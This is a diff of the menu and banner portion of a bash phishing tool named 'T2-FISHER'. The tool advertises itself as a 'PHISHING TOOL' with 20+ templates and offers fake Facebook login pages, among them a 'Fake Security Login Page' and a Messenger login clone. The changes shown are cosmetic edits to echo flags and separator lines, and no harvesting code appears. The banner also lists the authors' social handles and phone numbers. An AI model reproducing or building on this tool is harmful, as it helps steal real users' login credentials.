@@ -78,16 +78,16 @@ clear
 
 figlet T2-FISHER  | lolcat
 
-echo -b "_____________________________________________________________" | lolcat
-echo -b "TYPE      : PHISHING TOOL $green " |lolcat
-echo -b "VERSION   : 1.0v " | lolcat
-echo -b "TEMPLATES : 20+ TEMPLATES " | lolcat
-echo -b "AUTHOR    : TECHNOCYBER & HACKERSPUNK $green " |lolcat
-echo -b "INSTAGRAM : https://Instagram.com/Technocyber.sh $green " |lolcat
-echo -b "INSTAGRAM : https://Instagram.com/Hackerspunk $green " |lolcat
-echo -b "CONTACT   : +91 9960524818 (TECHNOCYBER) $green " |lolcat
-echo -b "CONTACT   : +91 7365009054 (HACKERSPUNK)  " | lolcat
-echo -b "_____________________________________________________________" | lolcat
+echo -TC "_____________________________________________________________" | lolcat
+echo -TC "TYPE      : PHISHING TOOL $green " |lolcat
+echo -TC "VERSION   : 1.0v " | lolcat
+echo -TC "TEMPLATES : 20+ TEMPLATES " | lolcat
+echo -TC "AUTHOR    : TECHNOCYBER & HACKERSPUNK $green " |lolcat
+echo -TC "INSTAGRAM : https://Instagram.com/Technocyber.sh $green " |lolcat
+echo -TC "INSTAGRAM : https://Instagram.com/Hackerspunk $green " |lolcat
+echo -TC "CONTACT   : +91 9960524818 (TECHNOCYBER) $green " |lolcat
+echo -TC "CONTACT   : +91 7365009054 (HACKERSPUNK)  " | lolcat
+echo -TC "_____________________________________________________________" | lolcat
 
 }
 
@@ -232,12 +232,14 @@ fi
 }
 
 facebook(){
+echo -TC "_____________________________________________________________" | lolcat
 printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Fake Security Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook Messenger Login Page\e[0m\n"
 printf "\e[0m\n"
+echo -TC "_____________________________________________________________" | lolcat
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
 
